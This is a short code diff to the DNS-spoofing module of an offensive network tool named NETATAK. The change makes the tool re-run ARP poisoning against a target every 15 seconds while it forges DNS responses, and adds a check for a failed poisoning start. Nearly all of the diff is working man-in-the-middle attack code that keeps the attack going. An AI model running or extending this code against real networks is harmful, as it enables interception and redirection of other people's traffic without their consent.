@@ -71,6 +71,8 @@ class dnspoof:
         try:
             print("{0}[*] NETATAK is starting ARP poisoning against {1}. Going to sleep for 15 seconds whilst this operation completes...".format(B, self.target))
             arp_start = arp_mitm.arp_mitm(self.target, self.rtrip, 0, self.timeout, self.pktintr)
+            if not arp_start:
+                return False
             arp_thread = threading.Thread(target=arp_start.find_targets, daemon=True)
             arp_thread.start()
             time.sleep(15)
@@ -78,7 +80,11 @@ class dnspoof:
             spoof_thread.start()
             print("{0}[*] NETATAK is now spoofing responses to DNS queries for {1}. Press CTRL+C to stop spoofing DNS responses and ARP poisoning.".format(B, self.target))
             while True:
-                time.sleep(1)
+                time.sleep(15)
+                arp_start = arp_mitm.arp_mitm(self.target, self.rtrip, 0, self.timeout, self.pktintr, verbose=0)
+                arp_thread = threading.Thread(target=arp_start.find_targets, daemon=True)
+                arp_thread.start()
+                continue
         except (KeyboardInterrupt):
             print("{0}[*] NETATAK is now stopping ARP poisoning against {1}".format(B, self.target))
             stop_arp = arp_mitm.arp_mitm(self.target, self.rtrip, 1, self.timeout, self.pktintr)
@@ -87,3 +93,4 @@ class dnspoof:
             print("{0}[*] NETATAK encountered an unexpected error whilst trying to conduct DNS spoofing. The error is: {1}.".format(R, sys.exc_info()[0]))
             print("{0}[*] NETATAK is now stopping ARP poisoning against {1}".format(B, self.target))
             arp_mitm.arp_mitm(self.target, self.rtrip, 1, self.timeout, self.pktintr)
+
